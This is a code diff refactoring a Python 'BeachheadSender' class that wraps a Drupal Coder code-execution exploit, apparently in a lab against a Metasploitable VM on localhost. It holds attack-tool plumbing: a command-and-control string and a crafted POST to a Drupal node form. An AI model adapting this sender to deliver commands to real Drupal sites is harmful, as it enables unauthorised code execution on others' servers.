@@ -9,8 +9,9 @@ class BeachheadSender:
     c_and_c = '\'print(\"Hello World\")\''
     request = None
 
-    def __init__(self):
+    def __init__(self, ip_addr: str, port: str, path: str):
         self.exploit = DrupalCoderExec()
+        self.request = self.create_request(ip_addr, port, path)
         pass
 
     def set_c_and_c(self, c_and_c: str):
@@ -44,7 +45,7 @@ class BeachheadSender:
         data += '&menu%5Bweight%5D=0&log=&path%5Balias%5D=&comment=1&name=metasploitable&date='
         data += '&status=1&additional_settings__active_tab=edit-menu&op=Save'
         
-        self.request = requests.Request('POST', url=url, headers=headers, params=params, data=data)
+        return requests.Request('POST', url=url, headers=headers, params=params, data=data)
     
     def send_request(self) -> requests.models.Response:
         s = requests.Session()
@@ -56,6 +57,5 @@ class BeachheadSender:
 
 
 if __name__ == "__main__":
-    sender = BeachheadSender()
-    sender.create_request('127.0.0.1', '8082', '')
+    sender = BeachheadSender(ip_addr='127.0.0.1', port='8082', path='')
     sender.send_request()
